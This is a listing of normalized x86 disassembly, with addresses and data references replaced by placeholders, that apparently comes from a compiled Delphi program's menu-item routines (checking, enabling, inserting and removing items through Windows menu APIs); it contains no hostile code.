xor ecx ecx
mov edx 0x10
call sub_402b18
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403eec
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_449c5c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404160
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c3b1
lea eax [ ebp - 0x24 ]
call sub_403e54
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44ab98
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44c3dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404260
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403ea8
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44c404
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44c574
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_44c584
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_44c44c
sub_44c44c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44ab08
push eax
call CheckMenuItem
mov eax esi
call sub_44c404
sub_44c4a0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_44c574
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44ab08
push eax
call EnableMenuItem
sub_44c518
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_44c8d8
mov edx eax
mov ecx ebx
mov eax edi
call sub_44aaa8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_44c404
sub_44c584
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413d6c
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_449bb0
sub_44c5f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_44c574
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_44c5dc
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_44c90c
mov ecx ebx
mov edx esi
mov eax edi
call sub_44c700
sub_44c63c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c574
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c584
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44c694
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_44c574
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44c584
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44c584
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_44c700
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_449bb0
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44aaa8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413de8
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_44c978
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_44c574
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44a9d8
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413d6c
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413d6c
mov dl [ eax + 0x3f ]
mov eax esi
call sub_44c518
sub_44c7b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_449bb0
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_44c574
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44a9d8
mov eax ebx
call sub_44c574
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413d6c
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413c5c
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_44c828
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_44c44c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44c55c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_44c55c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_44c8f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c574
mov edx eax
mov ecx esi
mov eax ebx
call sub_44c700
pop esi
pop ebx
retn
sub_44c90c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44c8d8
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_449bb0
sub_44c934
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_44c978
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_44c978
jmp r-xdata
mov eax ebx
call sub_44a9d8
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_44e650
sub_44c9d0
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ ebx + 0x4c ] eax
sub_44c9f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403104
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44cc8c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403300
mov edx ebx
mov eax edi
call sub_419924
mov eax ebx
mov si 0xffee
call sub_403300
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_44ca68
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421cbc
mov [ esi + 0x4c ] eax
sub_44ca9c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_44c574
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_44c584
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_44cadc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44c90c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_44c8f0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44c8f0
sub_44cb40
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_44c404
sub_44cb6c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44c3dc
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_44c44c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_44c4a0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403ea8
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_44c5cc
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_44c518
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_44c5a8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44c5bc
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44cc8c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44c55c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403300
sub_44ccb0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ccd0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44ccf0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cd10
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cd30
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cd50
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cd70
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cd90
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cdb0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cdd0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41440c
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_446c20
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_446d58
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_446db8
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_446ab8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_446e78
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44ce48
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419b70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44c55c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44c9f8
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44ce9c
jmp r-xdata
xor edx edx
mov eax esi
call sub_44a960
sub_44ce9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_448334
mov eax ebx
call sub_44cf0c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_448378
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419924
sub_44cee4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44cee4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44a034
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44c978
mov eax ebx
pop esi
pop ebx
retn
sub_44cf20
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c23c
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4043b4
sub_44cf50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403eec
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_44cfd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44d0f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404114
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404114
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404374
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404260
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0fd
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e78
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4043fc
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4041d4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404114
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404374
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4041d4
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_44d134
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44d5d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403eec
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d594
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44c574
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403eec
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d5da
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403e78
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403e78
lea eax [ ebp - 0x18 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax ebx
call sub_44d788
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c584
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404260
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_44cf50
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44c584
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c584
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403104
mov eax [ ebp - 0x20 ]
call sub_403104
mov eax [ ebp - 0x14 ]
call sub_403104
mov eax [ ebp - 0xc ]
call sub_403104
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_44cf50
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404114
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_44c584
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_44f02c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407a28
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403ea8
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c23c
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c23c
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44c584
push eax
